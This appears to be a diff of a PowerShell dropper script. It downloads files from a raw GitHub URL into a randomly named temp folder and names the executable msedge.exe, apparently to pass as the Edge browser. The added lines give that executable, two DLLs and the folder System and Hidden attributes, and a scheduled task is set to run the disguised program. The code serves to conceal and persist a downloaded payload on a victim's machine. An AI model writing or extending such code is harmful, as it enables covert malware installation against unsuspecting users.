@@ -15,15 +15,18 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/m
 
 
 
+#list files
+$filePath = "$env:temp/sVBXKuz/msedge.exe"
+$dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
+$dll2Path = "$env:temp/sVBXKuz/libopus.dll"
+$folderPath = "$env:temp/sVBXKuz/"
+
+
 #hide files
-$file = "$env:temp\sVBXKuz\msedge.exe"
-
-
-$attr = [System.IO.FileAttributes]::Hidden
-
-# Hide first file
-Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)
-
+Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 
 
 $taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\msedge.exe'
